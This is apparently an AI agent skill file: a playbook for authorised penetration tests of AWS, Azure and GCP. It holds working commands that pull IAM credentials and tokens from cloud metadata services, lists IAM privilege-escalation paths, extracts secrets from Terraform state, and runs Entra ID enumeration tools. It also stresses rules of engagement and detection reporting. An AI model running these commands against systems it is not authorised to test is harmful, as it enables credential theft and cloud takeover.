---
name: pt-cloud
description: Use when attacking or assessing a cloud control plane — AWS, Azure, or GCP credential abuse, IAM privilege escalation, metadata service reachability, Entra ID enumeration, or cloud-to-on-prem paths — including Russian requests (облако, AWS, Azure, Entra ID, GCP, повышение прав в IAM). Use when SSRF reaches metadata or a key/secret is found in code or on a host.
version: 1.0.0
author: operator
tags: [offensive, cloud, aws, azure, gcp, iam, entra]
---

# Cloud Control Plane

The perimeter moved: most cloud compromises start from a leaked key, an SSRF to the metadata service, or a misconfigured trust policy — not from a network exploit. Enumerate identity first, then find the shortest path to data.

## Phase 1: Establish identity

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-account-authorization-details > scans/cloud/aws-authz.json

az account show
az ad signed-in-user show
gcloud auth list; gcloud config list; gcloud projects list
```

From an SSRF or a compromised host, the metadata service is often the shortest path:

```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# AWS IMDSv2 (token required)
TOKEN=$(curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure
curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

## Phase 2: Enumerate, then map privilege escalation

```bash
# Broad automated sweeps — use scoped, read-only roles where possible
ScoutSuite aws --report-dir scans/cloud/scoutsuite-aws
cloudfox aws --profile <p> all-checks
pacu                       # interactive AWS exploitation framework
pmapper graph create; pmapper query 'who can do s3:* with resource *'

# Azure / Entra ID
roadrecon auth -u user@tenant.onmicrosoft.com -p 'pass'
roadrecon gather
roadrecon gui              # users, groups, apps, service principals, role assignments
azurehound -u user -p pass -t <tenant-id> list -o scans/cloud/azurehound.json
```

Common escalation paths to test explicitly:

| Provider | Path |
|---|---|
| AWS | `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:PassRole` + `lambda:CreateFunction`, `sts:AssumeRole` chain, `iam:UpdateAssumeRolePolicy` |
| AWS | SSM `SendCommand` on instances, EC2 user-data rewrite, `s3:GetObject` on Terraform state (secrets inside) |
| Azure | Owner/User Access Administrator on a subscription, managed identity assignment, `Microsoft.Compute/virtualMachines/runCommand` |
| Azure | App registration secret/cert add → app role → Graph API, `Directory.ReadWrite.All` abuse |
| GCP | `iam.serviceAccountTokenCreator`, `setIamPolicy` on project, `compute.instances.setMetadata` (SSH key injection) |

Terraform state is the highest-value file in most estates — it contains plaintext secrets, keys, and connection strings:

```bash
aws s3 ls s3://<bucket> --recursive | grep -i terraform
aws s3 cp s3://<bucket>/prod/terraform.tfstate . && jq '.resources[].instances[].attributes' terraform.tfstate
```

## Phase 3: Data access and impact

```bash
aws s3 ls                                  # list all buckets visible
aws s3 sync s3://<bucket> loot/cloud/<bucket> --dryrun
aws rds describe-db-instances
aws secretsmanager list-secrets
az keyvault secret list --vault-name <kv>
gcloud storage ls; gcloud secrets list
```

**Prove access, do not exfiltrate.** For each bucket or secret, record: name, size, sample object key, and one redacted screenshot or `head` of a single non-sensitive object. Mass download is both unnecessary and outside most RoEs.

## Phase 4: Cloud → on-prem

- VPN credentials or connection configs in Secrets Manager / Key Vault
- `Azure AD Connect` sync account → on-prem AD (see `pt-ad`)
- Hybrid-joined machines with cached tokens → lateral into the domain
- CI/CD runners with cloud roles and repo write access → supply-chain path

## Phase 5: Detection and IR reality

Cloud logging is often on but unwatched. Note in the report what was logged:

- CloudTrail / Activity Log / Audit Logs enabled and retained?
- GuardDuty / Defender for Cloud / SCC alerting to anyone?
- The specific API calls that *would* have alerted (e.g. `CreatePolicyVersion`, `runCommand`) and whether the client saw them

That gap — "the action was logged and nobody looked" — is often the most valuable sentence in the report.

## Recording

`notes\cloud-<provider>.md`:

```markdown
## Identity
arn:aws:iam::1234:user/ci-deploy  ->  policies: DeployPolicy (s3:*, lambda:*, iam:PassRole)
## Escalation proven
PassRole on role/lambda-exec + lambda:CreateFunction => code exec as role/lambda-exec
  Proof: pocs/CLOUD-01/{create_function.txt,invoke.txt}
## Reachable data
s3://client-backups (2.1 TB, holds DB dumps) — access proven with one object listing
```

## Common mistakes

| Mistake | Reality |
|---|---|
| Running `pacu` with full permissions on prod | It creates resources; use a scoped role and clean up |
| Bulk-downloading buckets | RoE breach, IR chaos, no extra proof value |
| Treating IMDS reachability as the finding | The finding is the role's permissions and the data it reaches |
| Ignoring Terraform state | It usually contains more secrets than the app does |
| Assuming logs equal detection | Logged and watched are different facts |
| Forgetting to revoke created keys/roles | Leftover persistence you created |
